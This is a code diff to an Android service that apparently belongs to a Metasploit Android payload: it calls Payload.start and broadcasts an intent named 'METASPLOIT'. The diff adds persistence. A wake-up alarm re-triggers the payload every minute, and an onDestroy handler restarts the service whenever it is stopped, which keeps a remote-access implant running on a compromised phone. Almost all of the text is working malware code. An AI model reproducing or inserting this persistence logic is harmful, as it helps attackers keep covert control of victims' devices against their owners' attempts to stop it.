@@ -9,6 +9,10 @@ import android.os.Looper;
 
 import java.lang.reflect.Method;
 
+import android.app.AlarmManager;
+import android.os.SystemClock;
+import android.app.PendingIntent;
+
 public class MainService extends Service {
 
     private static void findContext() throws Exception {
@@ -60,7 +64,21 @@ public class MainService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         Payload.start(this);
+        AlarmManager manager = (AlarmManager) getSystemService(ALARM_SERVICE);
+        //int anHour = 60 * 60 * 1000; // one hour
+        int anHour = 60 * 1000; // one minute
+        long triggerAtTime = SystemClock.elapsedRealtime() + anHour;
+        Intent i = new Intent("METASPLOIT");
+        PendingIntent pi = PendingIntent.getBroadcast(this, 0, i, 0);
+        manager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, pi);
         return START_STICKY;
+    }
+
+    @Override
+    public void onDestroy() {
+      Intent localIntent = new Intent(); //restart Service
+      localIntent.setClass(this, MainService.class);
+      this.startService(localIntent);
     }
 
 }
